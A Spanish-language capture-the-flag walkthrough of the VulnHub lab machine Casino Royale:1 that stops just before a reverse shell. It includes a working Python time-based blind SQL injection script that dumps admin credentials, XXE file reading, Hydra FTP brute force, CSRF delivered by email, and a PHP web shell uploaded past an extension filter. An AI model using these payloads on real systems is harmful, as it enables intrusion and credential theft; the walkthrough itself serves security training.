# Casino Royale:1 - VulnHub
### SO : Linux
### Dificultad : Media 
![CasinoRoyale](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/CasinoRoyale1.png)

## Técnicas Utilizadas

- Web Enumeration
- Abusing PokerMax - SQLI (SQL Injection)
- PokerMax Players Management
- Virtual Hosting
- Snowfox CMS Exploitation - Cross-Site Request Forgery (Add Admin) [CSRF]
- Abusing the SMTP service to send a fraudulent email in order to exploit the CSRF
- Information Leakage
- XXE Attack - XML External Entity Injection (Reading internal files)
- FTP Brute Force - Hydra
- Uploading malicious PHP file + Bypassing Restriction
- Information Leakage - Reading config files
- Abusing SUID privilege [Privilege Escalation]

## RECONOCIMIENTO
Realizamos un Reconocimiento de Red Local para identificar la IP de la maquina Victima, para ser mas precisos podemos ver el OUI de la IP
diciendo que el fabricante es VMware
```css
arp-scan -I ens33 192.168.195.0/24
```
![Arp](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/arp-can.png)
```ruby
ping -c 1 192.168.195.133
```
![Ping](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/ping.png)

- TTL -> 64 - LINUX 
- TTL -> 128 WINDOWS

ESCANEO DE PUERTOS ABIERTOS CON NMAP
```ruby
nmap -p- --open -sS --min-rate 5000 -vvvv -n -Pn 192.168.195.133 -sCV -oG puertos1
```
![nmap](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/nmap.png)

Por una buena practica podemos averiguar las tecnologias que estan corriendo la web que aloja la maquina
![web](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/web.png)
```ruby
whatweb 192.168.195.133
```
![whatweb](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/whatweb.png)

ENUMERACION DE DIRECTORIOS POTENCIALES VULNERABLES
```ruby
nmap --script http-enum -p80,8081 192.168.195.133
```
![nmapenum](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/nmapenum.png)

tenemos un `phpmyadmin` nos da la idea que se esta utilizando `php` como lenguaje
Si nos dirigimos a `http://192.168.195.133/install` podremos visualizar las versiones de PokerMax

Entonces vamos a buscar vulnerabilidades con `searchsploit`
```ruby
searchsploit PokerMax
```
![seachsploit](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/searchsploit.png)
![urlsearch](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/urlsearch.png)
![panel](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/panel.png)

Si usamos la URL que nos proporciona el exploit de `searchsploit` nos redirige a un panel de autenticación

# EXPLOTACION
### METODO 1 - SCRIPT PYTHON INSPIRADO DEL TITO S4VITAR
Si probamos una Inyección Sql básica en el panel de autenticacion nos autentica pero vamos a analizar con BurpSuite la Traza
![sqli](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/sqli.png)

Nos abrimos el BurpSuite y probamos ordenamientos de columnas para un intengo de login y al mismo tiempo ver informacion
![burp](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/orderby.png)
vemos que podemos hacer inyecciones, pero no lo podemos ver en web, como normalmente lo hacemos entonces, podemos automatizar este proceso
con un script en Pyhton para poder listar las bases de datos, tablas, columnas, filas, el codigo estará con todas las Lineas comentadas para que entiendan
el funcionamiento del script.

```python
#!/usr/bin/env python3

# Importamos las librerías necesarias
import sys
from pwn import *  # Pwntools para el manejo de logs
import requests  # Para hacer peticiones HTTP
import signal  # Para manejar señales como Ctrl+C
import time  # Para calcular tiempos de respuesta
import string  # Para trabajar con caracteres

# Función para manejar la interrupción con Ctrl+C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

# Capturamos la señal de interrupción (SIGINT) y llamamos a la función def_handler
signal.signal(signal.SIGINT, def_handler)

# URL de la página de login del administrador
login_url = "http://192.168.59.133/pokeradmin/index.php"

# Definimos el conjunto de caracteres que vamos a usar en el ataque de fuerza bruta
characters = string.ascii_lowercase + string.digits + ":"
# Esto incluye: 'abcdefghijklmnopqrstuvwxyz0123456789:'


def makeSQLi():
    data = ""  # Variable donde almacenaremos los datos extraídos

    # Creamos una barra de progreso con Pwntools para indicar el estado del ataque
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)  # Pequeña pausa para dar tiempo a que la barra de progreso inicie correctamente

    # Segunda barra de progreso para mostrar la información extraída
    p2 = log.progress("Data [DB: pokerleague] [Table: pokermax_admin] [Columns: username,password]")

    # Iteramos sobre las posiciones del contenido extraído (se asume un máximo de 50 caracteres)
    for position in range(1, 50):
        for character in characters:
            # Construcción del payload SQL Injection
            # La consulta intenta extraer los datos de la tabla 'pokermax_admin' en la base de datos 'pokerleague'
            # Se usa la función 'group_concat' para concatenar 'username' y 'password'
            payload = "admin' and if(substr((select group_concat(username,0x3a,password) from pokermax_admin),%d,1)='%s',sleep(0.75),1)-- -" % (position, character)

            # Datos que se enviarán en la solicitud POST
            post_data = {
                'op': 'adminlogin',
                'username': payload,  # Inyectamos el payload en el campo 'username'
                'password': 'admin'   # Password falso, no es relevante para el ataque
            }

            # Actualizamos la barra de progreso con el payload actual
            p1.status(post_data['username'])

            # Medimos el tiempo antes de la solicitud
            time_start = time.time()

            # Enviamos la solicitud con el payload SQL Injection
            r = requests.post(login_url, data=post_data)

            # Medimos el tiempo después de la solicitud
            time_end = time.time()

            # Si el tiempo de respuesta es mayor a 0.75 segundos, significa que el carácter es correcto
            if time_end - time_start > 0.75:
                data += character  # Agregamos el carácter encontrado a la variable 'data'
                p2.status(data)  # Mostramos en la barra de progreso la información extraída hasta el momento
                break  # Pasamos al siguiente carácter

    data += ""  # Fin del proceso de extracción

# Si el script se ejecuta directamente, llamamos a la función makeSQLi()
if __name__ == "__main__":
    makeSQLi()
```
Si queremos listar Bases de Datos, Tablas, columnas,etc es cuestion de jugar con los parametros del script, ejecutamos y obtendremos esto
![fuerzabrutasqli](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/fuerzabrutapy.png)

Vemos que tenemos un user:password, y nos logeamos
Analizando las opciones del Menú hay algo intersante en `Manage Players` en el Player `Valenka`
![ManagePlayers](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/ManagePlayers.png)
Al parecer se está aplicando Virtual Hosting y debemos actualizar el archivito `/etc/hosts`
![etchosts](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/etchost.png)

Nos dirige hacia la siguiente pagina y vemos informacion sobre el puerto 25(SMTP), tambien el CMS Snowfox y nos da informacion de que le podemos mandar un correo al usuario 
Valenka(Project Manager) que al parecer tiene permisos de Administrador en el Login de SnowFox
![webhosting](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/webhosting.png)

Recurrimos a `Searchsploit` para buscar vulnerabilidades sobre el CMS Snowfox
![searchcms](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/searchCMS.png)

El exploit nos muestra que a traves de un envio de correo por el puerto 25 SMTP podemos explotar un CSRF(Cross-Site Request Forgery) - (Add User), podemos crear un usuario mediante el envio de un
mail al usuario valenka referenciando a un cliente o player
![exploitcms](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/exploitCMS.png)
Ajustamos parámetros necesarios, para ver como se realiza este proceso nos montamos un server con python en local
```python
python3 -m http.server 80
```
vamos a enviar el mail a Valenka, ojo en la primera imagen asegurense que la URL nuestra este bien contemplada `http://192.168.195.128/pwned.html`

![mail](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/telnet.png)
![server](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/serverpyhton.png)

NOS LOGEAMOS Y LOGEO EXITOSO, ahora nos dirigimos al apartado de `Admin -> Manage User` y analizanndo usuarios encontramos una pista en uno de estos

![manage](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/manage.png)
![acces](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/access.png)

Nos dirigimos hacia la URL que nos proporciona y nos muestra lo siguiente:
![urlaccess](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/urlaccess.png)

`Ctrl + U ` Para inspeccionar la pagina porque la pagina no nos sirve desde afuera
![ctrl+u](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/ctrluaccess.png)

Al parecer tenemos entradas XML, hay una entrada XML que permite la carga de entidades externas XML, podemos explotar para poder 
visualizar archivos locales en el servidor

ABRIMOS EL BURPSUITE otra vez para poder interceptar y hacer solicitudes al server y ver resultados
OJO: CAMBIAMOS METODO A POST
![burpxxe](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/xxeburp.png)

Procedemos con la XXE
![xxe](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/xxe%20passwd.png)

Podemos ver que tenemos un usuario que hace alucion al puerto 21 FTP
![xxeusers](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/usersxxe.png)

pero tambien nos da una ruta interesante para la carga de archivos por FTP `/var/www/html/ultra-access-view`

![ultraaccess](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/ultra-acess.png)

Como solo tenemos el usuario, podemos hacer un intento de fuerza bruta con la Herramienta que mas dominen, en este caso utilice HYDRA
```ruby
hydra -l ftpUserULTRA -P passwords.txt ftp://192.168.195.133 -t 20
```
passwords.txt -> rockyou.txt

![hydrabf](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/hydrabf.png)

Nos logeamos al FTP y pa dentro, ahora si podemos cargar archivos maliciosos, en este caso para manipular una SHELL en la URL de la web
OJO: Eh intentado cargar archivos con extension .php y no le ha gustado, entonces eh probado con archivos que tengan las siguientes extensiones 
.php3, .php4, .php5,etc 

```php
<?php
    echo "<pre>". shell_exec($_REQUEST['cmd']). "</pre>";
?>
```
![cmdphp](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/cmdphp.png)
![put](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/put.png)

Ahora si manipulamos la URL con cmd  nos permite
![cmdurl](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/cmdurl.png)

Procedemos con una Reverse Shell













